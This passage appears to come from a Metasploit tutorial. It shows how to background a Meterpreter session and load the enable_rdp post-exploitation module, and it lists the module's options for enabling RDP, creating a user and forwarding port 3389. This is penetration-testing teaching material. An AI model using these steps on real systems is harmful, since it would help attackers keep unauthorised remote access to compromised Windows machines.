# How it works...

If you looked carefully at the output of the Meterpreter script command, you may have noticed the warning stating that Meterpreter scripts are deprecated and that we should use the post-exploitation module post/windows/manage/enable_rdp instead.

So, let's use the post-exploitation module and see how it works:

+   1. In the Meterpreter session, we will use the background command to background the session and go back to the Metasploit console:

```
meterpreter > background
[*] Backgrounding session 1...
msf exploit(mysql_payload) >
```

+   2. Then, we will use the use command to load the post/windows/manage/enable_rdp post-exploitation module and take a look at the options:

```
msf exploit(mysql_payload) > use post/windows/manage
/enable_rdp
msf post(enable_rdp) > show options

Module options (post/windows/manage/enable_rdp):

Name Current Setting Required Description
---- --------------- -------- -----------
ENABLE true no Enable the RDP Service and Firewall Exception.
FORWARD false no Forward remote port 3389 to local Port.
LPORT 3389 no Local port to forward remote connection.
PASSWORD no Password for the user created.
SESSION yes The session to run this module on.
USERNAME no The username of the user to create.

msf post(enable_rdp) >
```